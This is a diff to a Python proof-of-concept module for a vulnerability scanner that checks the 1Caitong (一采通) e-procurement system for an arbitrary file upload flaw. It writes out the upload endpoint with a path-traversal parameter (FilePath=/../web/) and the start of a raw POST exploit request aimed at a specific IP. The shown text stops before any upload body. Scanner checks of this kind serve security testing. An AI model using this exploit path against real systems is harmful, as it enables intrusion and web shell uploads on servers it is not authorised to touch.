@@ -5,19 +5,19 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 hh = hackhttp.hackhttp()
 
 class Vuln(ABVuln):
-    vuln_id = '1caitong_0006' # 平台漏洞编号，留空
+    vuln_id = '1Caitong_0006' # 平台漏洞编号，留空
     name = '一采通电子采购系统任意文件上传' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
     type = VulnType.FILE_UPLOAD # 漏洞类型
     disclosure_date = '2015-11-12'  # 漏洞公布时间
     desc = '''
-        一采通电子采购系统任意文件上传
+        一采通电子采购系统 /Comm/UploadFile/webUpload.aspx?AttId=test.cer&FilePath=/../web/ 任意文件上传漏洞。
     ''' # 漏洞描述
-    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0131973' # 漏洞来源
-    cnvd_id = '' # cnvd漏洞编号
-    cve_id = '' #cve编号
-    product = '一采通'  # 漏洞应用名称
-    product_version = ''  # 漏洞应用版本
+    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0131973
+    cnvd_id = 'Unknown' # cnvd漏洞编号
+    cve_id = 'Unknown' #cve编号
+    product = '1Caitong(一采通)'  # 漏洞应用名称
+    product_version = 'Unknown'  # 漏洞应用版本
 
 
 class Poc(ABPoc):
@@ -33,7 +33,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
-            vun_url=arg+"Comm/UploadFile/webUpload.aspx?AttId=test.cer&FilePath=/../web/"
+            vun_url=arg+"/Comm/UploadFile/webUpload.aspx?AttId=test.cer&FilePath=/../web/"
             raw='''POST /Comm/UploadFile/webUpload.aspx?AttId=test.cer&FilePath=%2f..%2fweb%2f HTTP/1.1
                 Host: 116.55.248.65:8001
                 Content-Length: 365
